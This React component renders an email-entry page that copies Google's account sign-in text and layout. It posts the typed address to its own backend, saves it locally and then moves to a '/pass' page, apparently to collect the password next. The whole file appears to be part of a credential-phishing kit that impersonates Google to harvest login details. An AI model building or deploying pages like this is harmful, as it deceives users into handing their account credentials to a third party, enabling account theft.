import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import FormErrMsg from "../components/FormErrMsg";
import axios from "axios";
import BASE_URL from "../components/urls";
import "../styles/Email.css"; // Import the custom CSS for styling
import logo from "../assets/logo.png";

// Validation schema
const schema = yup.object().shape({
  email: yup.string().required("Email is required"),
});

const Email = () => {
  const [isFocused, setIsFocused] = useState(false);
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);

  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm({ resolver: yupResolver(schema) });

  const submitForm = (data) => {
    setLoading(true);
    axios
      .post(`${BASE_URL}/`, data ) // Send email and password
      .then((response) => {
        console.log(response.data);
        localStorage.setItem("email", data.email);
        navigate("/pass"); // Redirect to dashboard or any other page
      })
      .catch((error) => {
        console.error("Error:", error);
      })
      .finally(() => {
        setLoading(false);
      });
  };

  const handleFocus = () => {
    setIsFocused(true);
  };

  const handleBlur = (e) => {
    if (e.target.value === "") {
      setIsFocused(false);
    }
  };

  return (
    <div className="email-container">
      <div className="logo">
        <img src={logo} alt="" />
      </div>
      <h1>Sign in</h1>
      <p>
        with your Google Account. You'll also sign in to Google services in your
        apps & Safari.
      </p>
      <form className="email-form" onSubmit={handleSubmit(submitForm)}>
        <div className={`input-container ${isFocused ? "focused" : ""}`}>
          <label htmlFor="email" className="email-label">
            Email or phone
          </label>
          <input
            type="email"
            id="email"
            onFocus={handleFocus}
            onBlur={handleBlur}
            required
            {...register("email")}
          />
        </div>
        <FormErrMsg errors={errors} inputName="email" />
        <div className="form-options">
          <a href="#forgot" className="forgot-email">
            Forgot email?
          </a>
        </div>
        <div className="btnSec">
          <div>
            {" "}
            <a href="#create" className="create-account">
              Create account
            </a>
          </div>
          <button type="submit" className="submit-btn">
            {loading ? "Loading..." : "Next"}
          </button>
        </div>
      </form>
    </div>
  );
};

export default Email;
